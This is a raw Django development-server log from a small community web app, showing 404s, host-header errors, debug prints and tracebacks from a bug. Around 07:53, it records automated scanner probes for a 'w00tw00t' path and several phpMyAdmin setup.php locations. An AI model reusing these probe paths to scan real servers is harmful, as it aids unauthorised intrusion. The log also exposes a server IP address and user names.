Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 07:43:48] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 07:43:49] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 07:43:52] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 07:43:53] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 07:43:58] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 07:43:58] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 07:45:14] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 07:45:14] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 07:46:39] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 07:46:39] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Invalid HTTP_HOST header: '1.2.3.4'. You may need to add '1.2.3.4' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 07:50:40] "GET / HTTP/1.0" 400 62034
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 07:51:59] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 07:51:59] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 07:52:10] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 07:52:10] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
[15/Dec/2018 07:52:19] "GET /community/3/members_list HTTP/1.1" 200 6328
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /w00tw00t.at.blackhats.romanian.anti-sec:)
[15/Dec/2018 07:53:50] "GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1" 400 63229
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /phpMyAdmin/scripts/setup.php
[15/Dec/2018 07:53:51] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 400 63086
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /phpmyadmin/scripts/setup.php
[15/Dec/2018 07:53:51] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 400 63086
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /pma/scripts/setup.php
[15/Dec/2018 07:53:51] "GET /pma/scripts/setup.php HTTP/1.1" 400 63009
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /myadmin/scripts/setup.php
[15/Dec/2018 07:53:52] "GET /myadmin/scripts/setup.php HTTP/1.1" 400 63053
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /MyAdmin/scripts/setup.php
[15/Dec/2018 07:53:54] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 400 63053
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer
[15/Dec/2018 07:53:54] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 500 59
----------------------------------------
Exception happened during processing of request from ('213.222.56.130', 44460)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 141, in run
    self.handle_error()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
    super().handle_error()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 368, in handle_error
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 331, in send_headers
    if not self.origin_server or self.client_is_modern():
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 344, in client_is_modern
    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
TypeError: 'NoneType' object is not subscriptable

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 647, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 154, in handle
    handler.run(self.server.get_app())
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 144, in run
    self.close()
  File "/usr/lib64/python3.7/wsgiref/simple_server.py", line 35, in close
    self.status.split(' ',1)[0], self.bytes_sent
AttributeError: 'NoneType' object has no attribute 'split'
----------------------------------------
[15/Dec/2018 07:54:00] "GET /login/ HTTP/1.1" 200 2576
[15/Dec/2018 07:54:02] "GET /login/ HTTP/1.1" 200 2576
[15/Dec/2018 07:54:05] "GET / HTTP/1.1" 200 13159
[15/Dec/2018 07:55:29] "GET / HTTP/1.1" 200 13159
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 07:55:30] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 07:55:30] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 07:55:37] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 07:55:37] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 07:56:18] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 07:56:18] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 07:56:27] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 07:56:28] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 07:56:30] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 07:56:31] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 07:56:48] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 07:56:48] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 07:57:08] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 07:57:08] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 07:58:13] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 07:58:13] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 07:58:17] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 07:58:17] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 07:59:42] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 07:59:42] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 08:00:01] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 08:00:01] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 08:01:03] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 08:01:03] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 08:01:17] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 08:01:18] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 08:01:54] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 08:01:54] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 08:02:14] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 08:02:15] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 08:02:36] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 08:02:36] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 08:05:46] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 08:05:47] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 08:06:00] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 08:06:00] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 08:06:05] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 08:06:06] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 08:06:07] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 08:06:07] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Not Found: /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg
[15/Dec/2018 08:07:51] "GET /media/https://imagejournal.org/wp-content/uploads/bb-plugin/cache/23466317216_b99485ba14_o-panorama.jpg HTTP/1.1" 404 2054
Not Found: /media/https://img.channeli.in/static/images/imglogo.png
[15/Dec/2018 08:07:52] "GET /media/https://img.channeli.in/static/images/imglogo.png HTTP/1.1" 404 1910
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 08:17:03] "GET / HTTP/1.1" 400 62403
[15/Dec/2018 08:31:43] "GET / HTTP/1.1" 200 13159
[15/Dec/2018 08:31:45] "GET /media/media/logo.png HTTP/1.1" 200 11255
[15/Dec/2018 08:31:45] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[15/Dec/2018 08:31:46] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Not Found: /logo.jpeg
[15/Dec/2018 08:31:47] "GET /logo.jpeg HTTP/1.1" 404 5958
[15/Dec/2018 08:31:53] "GET / HTTP/1.1" 200 13948
[15/Dec/2018 08:31:53] "GET /media/media/logo.png HTTP/1.1" 304 0
[15/Dec/2018 08:31:54] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[15/Dec/2018 08:31:54] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
Not Found: /logo.jpeg
[15/Dec/2018 08:31:55] "GET /logo.jpeg HTTP/1.1" 404 5958
[15/Dec/2018 08:34:03] "GET / HTTP/1.1" 200 13159
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 08:36:21] "GET / HTTP/1.1" 400 62410
Performing system checks...

System check identified no issues (0 silenced).
December 14, 2018 - 18:44:04
Django version 2.1, using settings 'project.settings'
Starting development server at http://0.0.0.0:80/
Quit the server with CONTROL-C.
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
admin <QuerySet [<Admins: Admins object (1)>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Nipun Goyal>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
admin <QuerySet [<Admins: Admins object (1)>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Nipun Goyal>]
admin <QuerySet [<Admins: Admins object (1)>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Nipun Goyal>]
admin <QuerySet [<Admins: Admins object (1)>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Nipun Goyal>]
here
None
here
None
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
/home/ec2-user/venv/lib/python3.7/site-packages/psycopg2/__init__.py:144: UserWarning: The psycopg2 wheel package will be renamed from release 2.8; in order to keep installing from binary please use "pip install psycopg2-binary" instead. For details see: <http://initd.org/psycopg/docs/install.html#binary-install-from-pypi>.
  """)
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 37, in dashboard
    print(social_user.extra_data['id'])
AttributeError: 'NoneType' object has no attribute 'extra_data'
[15/Dec/2018 08:45:03] "GET / HTTP/1.1" 500 67685
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 37, in dashboard
    print(social_user.extra_data['id'])
AttributeError: 'NoneType' object has no attribute 'extra_data'
[15/Dec/2018 08:45:05] "GET / HTTP/1.1" 500 67589
Not Found: /favicon.ico
[15/Dec/2018 08:45:06] "GET /favicon.ico HTTP/1.1" 404 5964
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 37, in dashboard
    print(social_user.extra_data['id'])
AttributeError: 'NoneType' object has no attribute 'extra_data'
[15/Dec/2018 08:45:08] "GET / HTTP/1.1" 500 67820
Internal Server Error: /
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/home/ec2-user/Togther/project/togther/views.py", line 37, in dashboard
    print(social_user.extra_data['id'])
AttributeError: 'NoneType' object has no attribute 'extra_data'
[15/Dec/2018 08:45:08] "GET / HTTP/1.1" 500 67589
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 08:49:55] "GET / HTTP/1.0" 400 62457
[15/Dec/2018 08:54:44] "GET / HTTP/1.1" 200 13948
[15/Dec/2018 08:54:44] "GET /media/media/logo.png HTTP/1.1" 304 0
[15/Dec/2018 08:54:45] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 304 0
[15/Dec/2018 08:54:45] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[15/Dec/2018 09:38:05] "GET / HTTP/1.1" 200 13159
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 09:45:20] "GET / HTTP/1.0" 400 62459
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 09:45:21] "GET / HTTP/1.0" 400 62459
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 09:45:28] "GET / HTTP/1.0" 400 62459
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 09:45:35] "GET / HTTP/1.0" 400 62459
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 09:45:51] "GET / HTTP/1.0" 400 62459
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 10:10:57] "GET / HTTP/1.1" 400 62449
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 10:17:56] "GET / HTTP/1.1" 400 62452
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 10:30:18] "GET / HTTP/1.1" 400 62458
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 10:31:13] "GET / HTTP/1.1" 400 62447
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 10:34:05] "GET / HTTP/1.0" 400 62457
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 10:37:53] "GET / HTTP/1.0" 400 62457
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 10:49:38] "GET / HTTP/1.0" 400 62459
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 10:49:41] "GET / HTTP/1.0" 400 62459
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[15/Dec/2018 10:49:45] "GET / HTTP/1.0" 400 62459
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
